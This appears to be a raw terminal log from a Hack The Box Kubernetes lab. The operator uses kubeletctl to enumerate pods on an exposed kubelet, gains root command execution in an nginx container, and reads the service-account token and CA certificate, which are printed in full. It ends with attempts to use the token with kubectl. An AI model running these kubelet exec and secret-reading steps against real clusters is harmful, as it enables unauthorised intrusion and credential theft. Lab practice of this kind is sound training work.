@@ -1,0 +1,627 @@
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls
+kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --server 10.129.241.165 pods
+┌────────────────────────────────────────────────────────────────────────────────┐
+│                                Pods from Kubelet                               │
+├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 3 │ kube-proxy-hwvjw                   │ kube-system │ kube-proxy              │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 4 │ storage-provisioner                │ kube-system │ storage-provisioner     │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 5 │ coredns-78fcd69978-m9s46           │ kube-system │ coredns                 │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 6 │ nginx                              │ default     │ nginx                   │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 7 │ etcd-steamcloud                    │ kube-system │ etcd                    │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 8 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
+│   │                                    │             │                         │
+└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --server 10.129.241.165 scan rce
+┌───────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                    Node with pods vulnerable to RCE                                   │
+├───┬────────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
+│   │ NODE IP        │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
+├───┼────────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│   │                │                                    │             │                         │ RUN │
+├───┼────────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 1 │ 10.129.241.165 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
+├───┼────────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 2 │                │ kube-proxy-hwvjw                   │ kube-system │ kube-proxy              │ +   │
+├───┼────────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 3 │                │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
+├───┼────────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 4 │                │ coredns-78fcd69978-m9s46           │ kube-system │ coredns                 │ -   │
+├───┼────────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 5 │                │ nginx                              │ default     │ nginx                   │ +   │
+├───┼────────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 6 │                │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
+├───┼────────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 7 │                │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
+├───┼────────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 8 │                │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
+└───┴────────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --server 10.129.241.165 exec "id" -p nginx -c nginx
+uid=0(root) gid=0(root) groups=0(root)
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls /home/kali/Pictures 
+Evil_Corp.png  HouseOfDragons.jpg
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# rm /home/kali/Pictures/HouseOfDragons.jpg 
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --server 10.129.241.165 exec "cat                  
+/var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
+error creating request: parse "https://10.129.241.165:10250/exec/default/nginx/nginx?command=cat\n/var/run/secrets/kubernetes.io/serviceaccount/token&input=1&output=1&tty=1": net/url: invalid control character in URL
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --server 10.129.241.165 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
+eyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --server 10.129.241.165 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
+-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
+AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
+YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
+HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
+deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
+VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
+hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
+1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
+MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
+BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
+lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
+DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
+9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
+xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
+JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
+kf2eZIBNMp0TFg==
+-----END CERTIFICATE-----
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# 
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano ca.crt                                
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls                    
+ca.crt  kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# mv ca.crt ca2.crt                     
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano ca.crt      
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls
+ca2.crt  ca.crt  kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export token"eyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ
+dquote> 
+dquote>  
+dquote> exit
+dquote> exit
+dquote> 
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export token"eyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ"
+export: not valid in this context: tokeneyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export token="eyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ"
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─#                                                                                                                                   
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods
+Error: unknown command "get" for "kubeletctl"
+Run 'kubeletctl --help' for usage.
+unknown command "get" for "kubeletctl"
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 pods                                                 1 ⨯
+Error: unknown flag: --token
+Usage:
+  kubeletctl pods [flags]
+
+Flags:
+  -h, --help   help for pods
+
+Global Flags:
+      --cacert string      CA certificate (example: /etc/kubernetes/pki/ca.crt )
+      --cert string        Private key (example: /var/lib/kubelet/pki/kubelet-client-current.pem)
+      --cidr string        A network of IP addresses (Example: x.x.x.x/24)
+  -k, --config string      KubeConfig file
+  -c, --container string   Container name
+      --http               Use HTTP (default is HTTPS)
+  -i, --ignoreconfig       Ignore the default KUBECONFIG environment variable or location ~/.kube
+      --key string         Digital certificate (example: /var/lib/kubelet/pki/kubelet-client-current.pem)
+  -n, --namespace string   pod namespace
+  -p, --pod string         Pod name
+      --port string        Kubelet's port, default is 10250
+  -r, --raw                Prints raw data
+  -s, --server string      Server address (format: x.x.x.x. For Example: 123.123.123.123)
+  -u, --uid string         Pod UID
+
+unknown flag: --token
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods                                             1 ⨯
+Error: unknown command "get" for "kubeletctl"
+Run 'kubeletctl --help' for usage.
+unknown command "get" for "kubeletctl"
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubeletctl --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods                                                           1 ⨯
+Error: unknown command "get" for "kubeletctl"
+Run 'kubeletctl --help' for usage.
+unknown command "get" for "kubeletctl"
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl   --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods                                                            1 ⨯
+Command 'kubectl' is available in '/snap/bin/kubectl'
+The command could not be located because '/snap/bin' is not included in the PATH environment variable.
+kubectl: command not found
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl                                                                                                                                                        127 ⨯
+Command 'kubectl' is available in '/snap/bin/kubectl'
+The command could not be located because '/snap/bin' is not included in the PATH environment variable.
+kubectl: command not found
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export PATH=$PATH:/snap/bin                                                                                                                                    127 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl                    
+kubectl controls the Kubernetes cluster manager.
+
+ Find more information at: https://kubernetes.io/docs/reference/kubectl/
+
+Basic Commands (Beginner):
+  create          Create a resource from a file or from stdin
+  expose          Take a replication controller, service, deployment or pod and expose it as a new Kubernetes service
+  run             Run a particular image on the cluster
+  set             Set specific features on objects
+
+Basic Commands (Intermediate):
+  explain         Get documentation for a resource
+  get             Display one or many resources
+  edit            Edit a resource on the server
+  delete          Delete resources by file names, stdin, resources and names, or by resources and label selector
+
+Deploy Commands:
+  rollout         Manage the rollout of a resource
+  scale           Set a new size for a deployment, replica set, or replication controller
+  autoscale       Auto-scale a deployment, replica set, stateful set, or replication controller
+
+Cluster Management Commands:
+  certificate     Modify certificate resources
+  cluster-info    Display cluster information
+  top             Display resource (CPU/memory) usage
+  cordon          Mark node as unschedulable
+  uncordon        Mark node as schedulable
+  drain           Drain node in preparation for maintenance
+  taint           Update the taints on one or more nodes
+
+Troubleshooting and Debugging Commands:
+  describe        Show details of a specific resource or group of resources
+  logs            Print the logs for a container in a pod
+  attach          Attach to a running container
+  exec            Execute a command in a container
+  port-forward    Forward one or more local ports to a pod
+  proxy           Run a proxy to the Kubernetes API server
+  cp              Copy files and directories to and from containers
+  auth            Inspect authorization
+  debug           Create debugging sessions for troubleshooting workloads and nodes
+  events          List events
+
+Advanced Commands:
+  diff            Diff the live version against a would-be applied version
+  apply           Apply a configuration to a resource by file name or stdin
+  patch           Update fields of a resource
+  replace         Replace a resource by file name or stdin
+  wait            Experimental: Wait for a specific condition on one or many resources
+  kustomize       Build a kustomization target from a directory or URL
+
+Settings Commands:
+  label           Update the labels on a resource
+  annotate        Update the annotations on a resource
+  completion      Output shell completion code for the specified shell (bash, zsh, fish, or powershell)
+
+Subcommands provided by plugins:
+
+Other Commands:
+  api-resources   Print the supported API resources on the server
+  api-versions    Print the supported API versions on the server, in the form of "group/version"
+  config          Modify kubeconfig files
+  plugin          Provides utilities for interacting with plugins
+  version         Print the client and server version information
+
+Usage:
+  kubectl [flags] [options]
+
+Use "kubectl <command> --help" for more information about a given command.
+Use "kubectl options" for a list of global command-line options (applies to all commands).
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods 
+error: unable to load root certificates: unable to parse bytes as PEM block
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export token"eyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ" 
+export: not valid in this context: tokeneyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export token="eyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53